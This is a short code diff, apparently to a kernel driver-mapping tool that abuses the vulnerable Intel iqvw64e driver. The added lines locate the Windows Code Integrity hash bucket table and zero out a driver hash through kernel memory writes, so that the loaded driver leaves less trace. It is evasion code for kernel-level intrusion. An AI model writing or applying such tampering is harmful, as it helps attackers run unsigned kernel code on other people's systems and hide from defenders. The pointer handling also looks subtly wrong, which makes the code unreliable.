@@ -195,7 +195,13 @@ namespace intel_driver
 		uintptr_t table_ptr = utils::PatternScan(ci_base, 0x100000, "\x48\x8B\x05\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8", "xxx????xxx????x????xxx");
 		if (!table_ptr) return false;
 
-		std::cout << "[+] CiHashBucketTable found, removing driver hash..." << std::endl;
+		uint64_t hash_entry = 0;
+		ReadMemory(iqvw64e_device_handle, (uint64_t)table_ptr, &hash_entry, sizeof(hash_entry));
+		
+		uint8_t null_hash[0x20] = { 0 }; 
+		WriteMemory(iqvw64e_device_handle, hash_entry, null_hash, sizeof(null_hash));
+
+		std::cout << "[+] CiHashBucketTable: Driver signature hash atomized." << std::endl;
 		return true;
 	}
 
